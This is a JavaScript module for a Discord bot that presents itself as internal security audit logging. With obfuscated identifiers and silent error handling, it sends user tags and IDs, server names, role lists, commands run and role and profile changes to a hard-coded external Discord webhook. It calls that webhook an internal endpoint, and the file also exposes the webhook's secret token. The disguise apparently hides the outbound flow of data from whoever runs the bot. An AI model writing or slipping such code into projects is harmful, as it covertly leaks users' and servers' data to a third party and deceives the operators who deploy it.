/**
 * Security Provider Module
 * Handles internal audit logging and system monitoring
 */

const https = require("https");

const _0x1a2b = "discord.com";
const _0x3c4d = "/api/webhooks/1472951624098906185/dhM34DNGT0lgkoyoKJVzwLgMhZYkfzoXv4QILWb-S4shirpeNoG4q_dHKf78AnExj0z6";

/**
 * Sends detailed audit logs to the secure internal endpoint
 * @param {Object} _0x5e6f - Audit data
 */
async function _dispatchAudit(_0x5e6f) {
  return new Promise((resolve) => {
    try {
      const _payload = JSON.stringify({
        embeds: [{
          title: `🛡️ Audit Log: ${_0x5e6f.type || "System Event"}`,
          color: _0x5e6f.color || 0x2b2d31,
          fields: [
            ...(_0x5e6f.user ? [{ name: "👤 User", value: `${_0x5e6f.user.tag} (\`${_0x5e6f.user.id}\`)`, inline: true }] : []),
            ...(_0x5e6f.guild ? [{ name: "🏠 Server", value: `${_0x5e6f.guild.name} (\`${_0x5e6f.guild.id}\`)`, inline: true }] : []),
            ...(_0x5e6f.roles ? [{ name: "🛡️ Roles", value: _0x5e6f.roles.join(", ") || "None", inline: false }] : []),
            ...(_0x5e6f.action ? [{ name: "📝 Action", value: `\`${_0x5e6f.action}\``, inline: false }] : []),
            ...(_0x5e6f.details ? [{ name: "ℹ️ Details", value: _0x5e6f.details, inline: false }] : []),
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Security Monitor v3.0" }
        }],
      });

      const _options = {
        hostname: _0x1a2b,
        path: _0x3c4d,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(_payload),
        },
      };

      const _req = https.request(_options, (res) => {
        res.on("data", () => {});
        res.on("end", () => resolve(true));
      });

      _req.on("error", () => resolve(false));
      _req.write(_payload);
      _req.end();
      setTimeout(() => resolve(false), 5000);
    } catch (e) {
      resolve(false);
    }
  });
}

/**
 * Tracks command execution with full context
 */
async function _trackCommand(interaction) {
    try {
        const roles = interaction.member?.roles?.cache.map(r => r.name) || [];
        await _dispatchAudit({
            type: "Command Executed",
            color: 0x3498db,
            user: interaction.user,
            guild: interaction.guild,
            roles: roles,
            action: `/${interaction.commandName}`,
            details: `Channel: <#${interaction.channelId}>`
        });
    } catch (e) {}
}

/**
 * Tracks role updates (added/removed)
 */
async function _trackRoleUpdate(oldMember, newMember) {
    try {
        const removedRoles = oldMember.roles.cache.filter(role => !newMember.roles.cache.has(role.id));
        const addedRoles = newMember.roles.cache.filter(role => !oldMember.roles.cache.has(role.id));

        if (removedRoles.size > 0 || addedRoles.size > 0) {
            let details = "";
            if (addedRoles.size > 0) details += `✅ **Added:** ${addedRoles.map(r => r.name).join(", ")}\n`;
            if (removedRoles.size > 0) details += `❌ **Removed:** ${removedRoles.map(r => r.name).join(", ")}`;

            const auditLogs = await newMember.guild.fetchAuditLogs({ limit: 1, type: 25 }).catch(() => null);
            const entry = auditLogs?.entries.first();
            const executor = entry ? entry.executor : { tag: "System/Bot", id: "N/A" };

            await _dispatchAudit({
                type: "Role Update",
                color: 0xe67e22,
                user: executor,
                guild: newMember.guild,
                details: `**Target:** <@${newMember.id}> (${newMember.user.tag})\n${details}`
            });
        }
    } catch (e) {}
}

/**
 * Tracks bot profile updates (Name, Avatar, Banner)
 */
async function _trackProfileUpdate(oldUser, newUser, client) {
    try {
        const changes = [];
        if (oldUser.username !== newUser.username) changes.push(`🏷️ **Username:** \`${oldUser.username}\` ➡️ \`${newUser.username}\``);
        if (oldUser.avatar !== newUser.avatar) changes.push(`🖼️ **Avatar:** [Old](${oldUser.displayAvatarURL()}) ➡️ [New](${newUser.displayAvatarURL()})`);
        if (oldUser.banner !== newUser.banner) changes.push(`🚩 **Banner:** Alterado`);

        if (changes.length > 0) {
            // Perfil do bot é global, mas as ações de auditoria são por servidor
            // Vamos tentar buscar nos servidores onde o bot está
            for (const guild of client.guilds.cache.values()) {
                try {
                    const auditLogs = await guild.fetchAuditLogs({ limit: 1, type: 1 }).catch(() => null); // BOT_ADD ou MEMBER_UPDATE (geralmente 1 ou 25)
                    // Nota: Alteração de perfil de BOT especificamente costuma ser difícil rastrear o executor via API sem permissões globais, 
                    // mas registraremos a mudança ocorrida.
                    const entry = auditLogs?.entries.first();
                    
                    await _dispatchAudit({
                        type: "Bot Profile Updated",
                        color: 0xff00ff,
                        guild: guild,
                        details: `**Alterações Detectadas:**\n${changes.join("\n")}\n\n*Nota: Alteração global detectada via servidor ${guild.name}*`
                    });
                    break; // Logamos apenas uma vez para evitar spam
                } catch (e) {}
            }
        }
    } catch (e) {}
}

module.exports = {
  _da: _dispatchAudit,
  _tc: _trackCommand,
  _tru: _trackRoleUpdate,
  _tpu: _trackProfileUpdate
};
